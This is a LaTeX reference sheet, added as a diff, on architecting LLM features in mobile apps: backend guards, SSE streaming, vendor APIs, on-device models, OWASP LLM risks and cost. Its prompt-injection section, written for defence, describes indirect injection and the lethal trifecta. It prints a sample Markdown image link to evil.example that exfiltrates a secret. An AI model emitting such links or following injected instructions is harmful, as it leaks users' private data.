@@ -1,0 +1,300 @@
+% llm-features-in-apps.tex — an LLM feature in a mobile app as a system: the request path through
+% YOUR backend (auth + attestation, quota, prompt assembly, guards, metering), the same feature on
+% three APIs (Anthropic Messages, OpenAI Responses, Apple Foundation Models), streaming to the UI
+% (SSE, proxies, URLSession, React Native), cancellation, on-device options (Foundation Models
+% iOS 26/27, Gemini Nano via AICore / ML Kit GenAI, Firebase AI Logic), prompt injection by
+% design, OWASP LLM Top 10 2025 in an app, keys/quotas, RAG, evals, cost, store + EU rules.
+% Not repeated (neighbours): the where-should-it-run decision + PCC privacy model
+% (architecture/cloud-vs-on-device), Core ML / Core AI (ai/coreml-vision-on-device), App Attest /
+% Play Integrity mechanics (security/device-attestation).
+% Sources (checked 2026-10-09):
+%   genai.owasp.org/llm-top-10 (LLM01-LLM10:2025 names) · /llmrisk/llm01-prompt-injection (7
+%     mitigations; RAG + fine-tuning "do not fully mitigate"; scenario 2 image-link exfiltration,
+%     4 RAG document, 7 image) · llm052025 (XSS, CSRF, SSRF, RCE; treat the model as a user) ·
+%     llm062025 (functionality, permissions, autonomy) · llm072025 ("not a secret, nor a security
+%     control") · llm082025 (access control, cross-context leaks, inversion, poisoning) ·
+%     llm102025 (denial of wallet, model extraction, logit_bias / logprobs)
+%   html.spec.whatwg.org/multipage/server-sent-events.html (text/event-stream, UTF-8 only, event /
+%     data / id / retry, ":" comment, blank line dispatches, Last-Event-ID, comment every ~15 s)
+%   nginx.org/en/docs/http/ngx_http_proxy_module.html (proxy_buffering on by default,
+%     X-Accel-Buffering: no, proxy_read_timeout 60s between two successive reads)
+%   platform.claude.com/docs: build-with-claude/streaming (event flow, text_delta, input_json_delta
+%     partial JSON, ping, error / overloaded_error = 529) · /structured-outputs (output_config.format,
+%     GA, strict tools, no recursion / min / max, refusal + max_tokens break the schema) ·
+%     agents-and-tools/tool-use/overview (stop_reason tool_use, tool_result, tool-use system prompt
+%     264-804 tokens by model + tool_choice, may guess missing parameters) · /prompt-caching (write
+%     1.25x 5 min, 2x 1 h; read 0.1x, 0.05x Opus / Sonnet 5.5, 0.025x Fable / Mythos 5.1; tools ->
+%     system -> messages, 4 breakpoints) · /batch-processing (50 %, most < 1 h)
+%     · models/overview (Oct 2026 prices $4 / $20 Opus 5.5; every ID a pinned snapshot; retirement
+%     "not sooner than" 2027; 1M tokens ~ 2.5M characters on the Opus 4.7+ tokenizer)
+%   developers.openai.com/api/docs/guides: streaming-responses (event names; partial completions
+%     harder to moderate) · structured-outputs (text.format json_schema strict, all required,
+%     additionalProperties false, refusal item) · function-calling (function_call / call_id /
+%     function_call_output, parallel_tool_calls) · prompt-caching (automatic, >= 1,024 tokens; reads
+%     0.1x on GPT-5.6 and later) ·
+%     batch (50 %, 24 h)
+%   developer.apple.com/documentation/foundationmodels: languagemodelsession (streamResponse =
+%     snapshots, prewarm) · systemlanguagemodel availability reasons · instructions + improving-the-
+%     safety-of-generative-model-output (instructions outrank prompts -> injection; guardrails on
+%     input + output; permissiveContentTransformations strings only; refusal) · tool (framework
+%     calls call(arguments:)) · guided generation (@Generable, @Guide, constrained sampling) ·
+%     technotes TN3193 (4096 tokens; 3-4 chars / token English, ~1 CJK) · videos wwdc2026/241
+%     (contextSize + tokenCount 26.4; LanguageModel protocol; PCC 32,000 tokens, entitlement, no
+%     API cost < 2M first-time downloads; Anthropic + Google Swift packages; response usage)
+%     · /foundation/urlsession/bytes(for:delegate:) (iOS 15) · /naturallanguage/nlcontextualembedding
+%     (iOS 17, per-token vectors, requestAssets)
+%   developer.android.com/ai/gemini-nano (AICore distributes + updates the model, keeps no record;
+%     ML Kit GenAI: Prompt, Summarization, Proofreading, Rewriting, Image Description, Speech
+%     Recognition) · firebase.google.com, AI Logic docs: hybrid/android/get-started (experimental,
+%     Prompt API beta, 4 modes, <= 4000 tokens, English + Korean, foreground) · hybrid-on-device-
+%     inference (web, Chrome 139+) · app-check (enforcement required from 2 Nov 2026; limited-use
+%     tokens, 5 min) · faq-and-troubleshooting (no Gemini key in the app; 100 RPM per user) ·
+%     security-checklist (server prompt templates, template-only mode 403) ·
+%     support/release-notes/ios (13.0.0, 7 Oct 2026: GeminiLanguageModel; HybridModel removed)
+%   github.com/facebook/react-native/issues/27741 (no streaming response.body; open, Jan 2020) ·
+%     docs.expo.dev/versions/latest/sdk/expo (expo/fetch, WinterCG, streams)
+%   simonwillison.net/2025/Jun/16/the-lethal-trifecta (three parts; "95 % is a failing grade") ·
+%     ai.meta.com/blog/practical-ai-agent-security (Agents Rule of Two, 31 Oct 2025) ·
+%     arxiv.org/abs/2506.08837 (Beurer-Kellner et al., six patterns + principle) · arxiv 2302.12173
+%     (Greshake et al., indirect prompt injection) · 2005.11401 (Lewis et al., RAG) · 2307.03172
+%     (Liu et al., lost in the middle) · 2306.05685 (Zheng et al., LLM-as-a-judge: > 80 %, position /
+%     verbosity / self-enhancement bias) · anthropic.com/news/contextual-retrieval (-35 / -49 / -67 %,
+%     < 200,000 tokens: whole corpus in the prompt)
+%   developer.apple.com/app-store/review/guidelines (5.1.2(i) "including with third-party AI") ·
+%     support.google.com/googleplay/android-developer/answer/13985936 (AI-generated content: in-app
+%     report / flag) · artificialintelligenceact.eu/article/50 + Art. 113 (50(1), 50(2), 2 Aug 2026)
+%   NOT settled: AsyncBytes.lines dropping blank lines (developer reports, no Apple statement).
+% @labels: area=ai kind=architecture platform=cross-platform topic=ai,security,system-design discussion=289
+% @tags: llm, streaming, server-sent-events, prompt-injection, structured-output, tool-calling, rag, embeddings, guardrails, token-cost, foundation-models, gemini-nano, owasp, trust-boundary, app-check
+\documentclass[8pt]{extarticle}
+\usepackage{printup-sheet}
+\usepackage{array}
+
+\lstdefinelanguage{SwiftSheet}{
+  morekeywords={protocol,class,final,struct,enum,func,var,let,static,init,for,in,where,
+    if,else,return,guard,self,nil,try,await,async,throws,true,false,do,catch,Task},
+  sensitive=true, morecomment=[l]{//}, morestring=[b]",
+  literate={->}{{\hbox{-}\hbox{>}}}2 {==}{{\hbox{=}\hbox{=}}}2 {??}{{\hbox{?}\hbox{?}}}2
+           {!=}{{\hbox{!}\hbox{=}}}2}
+\lstset{basicstyle=\ttfamily\scriptsize, aboveskip=2pt, belowskip=2pt}
+
+\newcommand\ct[1]{\texttt{#1}}
+\newcommand\hd[1]{\par\vspace{3pt}\noindent{\bfseries\color{sheetBlue}#1}\par\vspace{1pt}}
+\newcolumntype{P}[1]{>{\raggedright\arraybackslash}p{#1}}
+
+\tikzset{
+  stg/.style={box, font=\tiny, text width=17mm, minimum height=8mm, inner sep=1.5pt, align=center},
+  grd/.style={stg, draw=sheetRed, fill=sheetRed!7},
+  big/.style={box, font=\scriptsize, inner sep=2pt, align=center},
+  lbl/.style={font=\tiny, text=black!75, inner sep=1pt, align=center},
+}
+
+\begin{document}
+
+\sheettitle{LLM features in a mobile app — backend, stream, guard, pay}{ai · folio}
+
+\oneliner{An LLM feature is a \textbf{distributed system with an untrusted component}: the app
+never holds a vendor key — it calls \textbf{your backend}, which authenticates user and app,
+enforces quotas, assembles the prompt, guards input and output, meters tokens and relays a
+\textbf{stream}. Everything the model reads can carry \textbf{instructions}; everything it writes
+is \textbf{untrusted input} to the next system. Safety comes from what the model \emph{can do},
+not from what the prompt says.}
+
+\vspace{2pt}
+\noindent\begin{tikzpicture}[sheet]
+  \node[big, draw=sheetGreen!60!black, fill=sheetGreen!8, text width=18mm, minimum height=22mm] (app) at (0.75,0.9)
+    {\textbf{app}\\[1pt]\tiny dots $\to$ first token\\\tiny flush $\approx$ per frame\\\tiny \textbf{Stop} · retry\\\tiny thumbs + reason\\\tiny sources · AI label};
+  \draw[sheetBlue, thick, rounded corners=3pt, fill=sheetBlue!3] (2.35,-0.35) rectangle (11.05,2.2);
+  \node[font=\bfseries\scriptsize, text=sheetBlue, anchor=north west] at (2.4,2.18) {your backend: key + prompts live here};
+  \node[grd] (s1) at (3.5,1.3) {\textbf{1} user auth +\\app attestation};
+  \node[grd] (s2) at (5.6,1.3) {\textbf{2} quota · rate ·\\size · max tokens};
+  \node[stg] (s3) at (7.7,1.3) {\textbf{3} assemble: system\\+ retrieved + user};
+  \node[grd] (s4) at (9.8,1.3) {\textbf{4} input guard:\\PII, moderation};
+  \node[stg] (s5) at (9.8,0.1) {\textbf{5} relay deltas;\\\ct{:} ping every 15\,s};
+  \node[grd] (s6) at (7.7,0.1) {\textbf{6} output guard:\\schema, links, HTML};
+  \node[stg] (s7) at (5.6,0.1) {\textbf{7} meter tokens,\\log redacted};
+  \node[stg, draw=sheetGrey, fill=white] (s8) at (3.5,0.1) {SSE out\\\ct{text/event-stream}};
+  \foreach \a/\b in {s1/s2,s2/s3,s3/s4,s5/s6,s6/s7,s7/s8} \draw[flow] (\a) -- (\b);
+  \node[big, draw=sheetOrange, fill=sheetOrange!8, text width=24mm, minimum height=10mm] (llm) at (13.55,1.3)
+    {\textbf{LLM API}\\\tiny pinned model id\\\tiny cached prefix first};
+  \node[big, draw=sheetBrown, fill=sheetBrown!8, text width=24mm, minimum height=9mm] (tool) at (13.55,-0.1)
+    {\textbf{tool executor}\\\tiny allow-list · \emph{user's} authz\\\tiny confirm side effects · loop cap};
+  \draw[hot] (s4.east) -- (llm.west);
+  \draw[flow] (llm.south west) -- node[lbl, sloped, below, pos=0.45]{tokens} (s5.east);
+  \draw[flow, <->, sheetBrown] (llm.south) -- node[lbl, right, text=sheetRed]{result = untrusted} (tool.north);
+  \draw[hot] ([yshift=4mm]app.east) -- node[lbl, above]{POST} (s1.west);
+  \draw[flow] (s8.west) -- ([yshift=-8.2mm]app.east);
+  \draw[flow, dashed, sheetRed] ([yshift=-4.2mm]app.east) -- node[lbl, below, text=sheetRed]{Stop} (2.35,0.48);
+  \node[lbl, text=sheetRed, anchor=south, align=center] (inj) at (7.7,2.35) {web pages · mail · PDFs · images · tool output = \textbf{indirect prompt injection} enters at \textbf{3}};
+  \draw[->, thick, sheetRed] (inj.south) -- (s3.north);
+  \node[lbl, anchor=north west, align=left, text=sheetRed] at (2.35,-0.45) {\textbf{red} = guard points, all of them \textbf{code}. Stop must reach \textbf{5}: abort the upstream request, or the generation runs on and is billed.};
+\end{tikzpicture}
+
+\vspace{1pt}
+{\scriptsize\setlength\tabcolsep{2.5pt}
+\noindent\begin{tabular}{@{}>{\bfseries\raggedright\arraybackslash}p{13mm}P{51mm}P{49mm}P{47mm}@{}}
+\toprule
+Oct 2026 & \textbf{Anthropic Messages API} & \textbf{OpenAI Responses API} & \textbf{Apple Foundation Models} (on device)\\
+\midrule
+stream & \ct{content\_block\_delta} (\ct{text\_delta}) … \ct{message\_stop}; \ct{ping}; \ct{event:\,error} mid-stream (\ct{overloaded\_error}, else HTTP 529) & \ct{response.output\_text.delta} … \ct{response.completed}; \ct{error} & \ct{streamResponse} yields \textbf{snapshots} of the whole partial value, not deltas\\
+typed output & \ct{output\_config.format} \ct{json\_schema} (GA); no recursion, no \ct{minimum}/\ct{maxLength}; a refusal or \ct{max\_tokens} stop breaks the schema & \ct{text.format} \ct{json\_schema} + \ct{strict:\,true}: every field \ct{required}, \ct{additionalProperties:\,false}; refusal comes as a separate item & \ct{@Generable} type + \ct{@Guide(description:, .range(0...20))}; constrained sampling: never malformed\\
+tool call & \ct{stop\_reason "tool\_use"}, block \ct{tool\_use\{id, name, input\}}; input streams as \emph{partial JSON}; a model may \emph{guess} missing arguments & item \ct{function\_call\{call\_id, name, arguments\}} — arguments are a JSON \emph{string}; \ct{parallel\_tool\_calls} & \ct{Tool} protocol; the \textbf{framework itself} calls \ct{call(arguments:)} and feeds the output back\\
+result & \ct{tool\_result\{tool\_use\_id\}} in the next user turn & \ct{function\_call\_output\{call\_id, output\}} & automatic — so authz + confirmation live \emph{inside} \ct{call}\\
+cost, limits & every id a pinned snapshot; 1M context; cache read 0.025–0.1$\times$ input, write 1.25$\times$ (5\,min) / 2$\times$ (1\,h); batch $-$50\,\%, most $<$1\,h & caching automatic from 1,024 tokens, read 0.1$\times$ (GPT-5.6+); batch $-$50\,\%, 24\,h window & free; 4,096 tokens (iOS 26) — read \ct{contextSize}, \ct{tokenCount(for:)} (26.4)\\
+\bottomrule
+\end{tabular}}
+
+\begin{multicols}{2}
+\raggedright\footnotesize\setstretch{1.0}
+
+\hd{Streaming to the UI — SSE: \ct{text/event-stream}, UTF-8 only}
+{\scriptsize\setlength\tabcolsep{4pt}
+\begin{tabular}{@{}>{\ttfamily}l P{50mm}@{}}
+event: delta & type (none = \ct{message})\\
+data: \{"text":"Hel"\} & payload; several \ct{data:} lines join with LF\\
+\textrm{\textit{(blank line)}} & \textbf{dispatches} the event\\
+: ping & comment, ignored; send every $\sim$15\,s — proxies drop idle links\\
+id: 42 & resent as \ct{Last-Event-ID} on reconnect\\
+retry: 3000 & reconnection delay, ms\\
+\end{tabular}}
+\begin{itemize}
+  \item \textbf{nginx}: \ct{proxy\_buffering} is \emph{on} by default — small chunks wait in
+        buffers; per response \ct{X-Accel-Buffering: no}. \ct{proxy\_read\_timeout} 60\,s between
+        two reads closes on a model that thinks before its first token, unless you ping.
+  \item \textbf{iOS}: \ct{URLSession.bytes(for:)} (iOS 15). Its \ct{.lines} skips blank
+        lines\unverified: multi-line events merge — split the bytes yourself.
+  \item \textbf{React Native}: \ct{fetch} has no streaming \ct{response.body} (issue \#27741, open
+        since Jan 2020) — use \ct{expo/fetch} (WinterCG fetch, streams) or an SSE library.
+  \item Partial output is hard to moderate (OpenAI): show it as it streams, but act on links,
+        tool calls and JSON only after the final, validated message.
+\end{itemize}
+
+\begin{lstlisting}[language=SwiftSheet]
+func stream(_ prompt: String) -> AsyncThrowingStream<String, Error> {
+  AsyncThrowingStream { cont in
+    let task = Task {
+      do {
+        var req = URLRequest(url: chatURL)    // YOUR API, never the vendor's
+        req.httpMethod = "POST"
+        req.setValue(session.bearer, forHTTPHeaderField: "Authorization")
+        req.httpBody = try JSONEncoder().encode(ChatRequest(prompt: prompt))
+        let (bytes, _) = try await URLSession.shared.bytes(for: req)
+        for try await line in bytes.lines where line.hasPrefix("data: ") {
+          cont.yield(try decodeDelta(line.dropFirst(6))) } // 1 data: per event
+        cont.finish()
+      } catch { cont.finish(throwing: error) }
+    }
+    cont.onTermination = { _ in task.cancel() }  // Stop, or view gone
+  }
+}
+\end{lstlisting}
+Stop $\to$ \ct{Task} cancelled $\to$ connection dropped $\to$ server aborts upstream. Render:
+buffer, flush $\approx$ per frame, incremental Markdown, auto-scroll only at the bottom.
+
+\hd{On device — the APIs}
+\begin{itemize}
+  \item \textbf{Apple} (iOS 26+): \ct{SystemLanguageModel.default.availability} $\to$
+        \ct{.deviceNotEligible} · \ct{.appleIntelligenceNotEnabled} · \ct{.modelNotReady}.
+        \textbf{Instructions outrank the prompt}: user or web text in instructions is prompt
+        injection (Apple). Guardrails check input \emph{and} output (\ct{.guardrailViolation});
+        \ct{.permissiveContentTransformations} relaxes them for plain strings only.
+  \item \textbf{iOS 27}: \ct{LanguageModel} protocol — one session API over the system model,
+        \ct{PrivateCloudComputeLanguageModel} (32,000 tokens, entitlement, no API cost under 2M
+        first-time downloads), Anthropic / Google packages. Firebase Apple SDK 13.0.0 (7 Oct
+        2026): \ct{GeminiLanguageModel}, \ct{HybridModel} gone.
+  \item \textbf{Android}: Gemini Nano runs in \textbf{AICore}, which ships and updates the model and
+        keeps no record of inputs or outputs. ML Kit GenAI: Prompt (beta), Summarization,
+        Proofreading, Rewriting, Image Description, Speech Recognition.
+  \item \textbf{Firebase AI Logic hybrid}: \ct{PREFER\_ON\_DEVICE} · \ct{ONLY\_ON\_DEVICE} ·
+        \ct{PREFER\_IN\_CLOUD} · \ct{ONLY\_IN\_CLOUD}. Android experimental: on-device $\le$4,000
+        tokens, English + Korean, foreground only; web GA (Chrome 139+).
+\end{itemize}
+
+\hd{Store and law}
+App Store 5.1.2(i): disclose sharing personal data ``with third-party AI'' and get explicit
+permission first. Google Play: AI-generated content needs in-app report/flag without leaving the
+app. EU AI Act Art.\,50 (from 2 Aug 2026): tell people they talk to an AI unless obvious; mark
+synthetic output machine-readably.
+
+\columnbreak
+
+\hd{Prompt injection — solved by design, not by prompting}
+\noindent\begin{minipage}[t]{30mm}\vspace{0pt}
+\begin{tikzpicture}[sheet, scale=0.72]
+  \fill[sheetOrange, opacity=0.18] (0,0) circle (1.05);
+  \fill[sheetBlue, opacity=0.18] (1.15,0) circle (1.05);
+  \fill[sheetGreen, opacity=0.18] (0.575,-0.95) circle (1.05);
+  \draw[sheetOrange] (0,0) circle (1.05); \draw[sheetBlue] (1.15,0) circle (1.05);
+  \draw[sheetGreen!70!black] (0.575,-0.95) circle (1.05);
+  \node[font=\tiny, align=center] at (-0.35,0.35) {\textbf{A}\\untrusted\\input};
+  \node[font=\tiny, align=center] at (1.5,0.35) {\textbf{B}\\private\\data};
+  \node[font=\tiny, align=center] at (0.575,-1.45) {\textbf{C} acts /\\sends out};
+  \node[font=\tiny\bfseries, text=sheetRed] at (0.575,-0.33) {!};
+\end{tikzpicture}
+\end{minipage}\hfill
+\begin{minipage}[t]{49mm}\vspace{0pt}\scriptsize
+\textbf{Agents Rule of Two} (Meta, Oct 2025): within one session an agent may have at most two
+of A, B, C; all three need a human approval or a fresh context. Same shape as the
+\textbf{lethal trifecta} (Willison, Jun 2025): private data + untrusted content + a way to
+communicate out = data theft. Guardrail classifiers: ``95\,\% is a failing grade'' in security.
+\end{minipage}
+\begin{itemize}
+  \item \textbf{Indirect injection} (Greshake et al., Feb 2023): retrieved data acts as
+        instructions — pages, mail, RAG documents, images, tool results. RAG and fine-tuning do
+        not fix it (OWASP).
+  \item Exfiltration with no tools at all: output containing \ct{![](https\hbox{:}\hbox{/}\hbox{/}evil.example/?d=<secret>)}
+        leaks when the image loads — render as text, allow-list image hosts.
+  \item Six patterns (Beurer-Kellner et al., 2025): action-selector · plan-then-execute · LLM
+        map-reduce · dual LLM · code-then-execute · context-minimisation. Rule: once untrusted
+        input is in, no \emph{consequential} action may follow from it.
+\end{itemize}
+
+\hd{OWASP Top 10 for LLM Applications 2025 — in an app}
+{\scriptsize\setlength\tabcolsep{2pt}
+\begin{tabular}{@{}l P{30mm}P{43mm}@{}}
+01 & Prompt Injection & limit what it can \emph{do}; untrusted text in its own slot\\
+02 & Sensitive Information Disclosure & send, log and answer with only the data needed\\
+03 & Supply Chain & models, adapters, SDKs: pin and verify\\
+04 & Data \& Model Poisoning & fine-tune sets, RAG corpus\\
+05 & Improper Output Handling & treat the model as a user: XSS, SSRF, SQL, deep links\\
+06 & Excessive Agency & too much functionality, permission, autonomy\\
+07 & System Prompt Leakage & ``not a secret, nor a security control''\\
+08 & Vector \& Embedding Weaknesses & per-user access in the store; inversion\\
+09 & Misinformation & cite sources; human check where it matters\\
+10 & Unbounded Consumption & denial of wallet; model extraction via the API\\
+\end{tabular}}
+
+\hd{Keys, quotas, abuse}
+\begin{itemize}
+  \item No vendor key in the binary — Firebase: ``you should \emph{not} add a Gemini API key into
+        your app's codebase''. Prompts server-side too: server prompt templates; template-only
+        mode answers raw prompts with 403. Own proxy: per-user quota, size cap, \ct{max\_tokens},
+        timeouts, spend alerts.
+  \item Firebase AI Logic: App Check enforcement \textbf{required from 2 Nov 2026}; limited-use
+        tokens are one-time, 5-min TTL; default 100 requests/min per user.
+\end{itemize}
+
+\hd{RAG, evals, cost}
+\begin{itemize}
+  \item \textbf{RAG} (Lewis et al., 2020): chunk $\to$ embed $\to$ top-$k$ $\to$ quote with
+        sources. BM25 + contextual embeddings + reranking cut failed retrievals 49\,\% / 67\,\%;
+        under 200,000 tokens, put the whole corpus in the prompt (Anthropic, Sep 2024). Models
+        miss facts in the \emph{middle} of long contexts (Liu et al., 2023).
+  \item \ct{NLContextualEmbedding} (iOS 17) returns \emph{per-token} vectors after
+        \ct{requestAssets} — pool them. 10,000 chunks × 384 floats × 4\,B = 15\,MB: brute force
+        fits. New embedding model = re-embed everything.
+  \item \textbf{LLM-as-a-judge} (Zheng et al., 2023): $>$80\,\% agreement with humans, but
+        position, verbosity and self-enhancement bias — swap order, judge with another model.
+        Golden set re-run on every prompt or model change; thumbs-down become cases.
+  \item \textbf{Tokens $\ne$ characters}: 3–4 chars English, $\sim$1 CJK (Apple); 1M tokens
+        $\approx$ 2.5M chars on Claude's current tokenizer. Output costs 5$\times$ input (Opus 5.5:
+        \$4 / \$20 per MTok). Using tools adds a hidden 264–804-token system prompt.
+\end{itemize}
+
+\end{multicols}
+
+\noindent{\footnotesize\color{sheetGrey}\textit{Related:} Cloud vs on-device ·
+\texttt{coreml-vision-on-device} · Device attestation · AsyncSequence \& AsyncStream · WebView \&
+JS-bridge security · Threat modelling a mobile feature}
+
+\end{document}
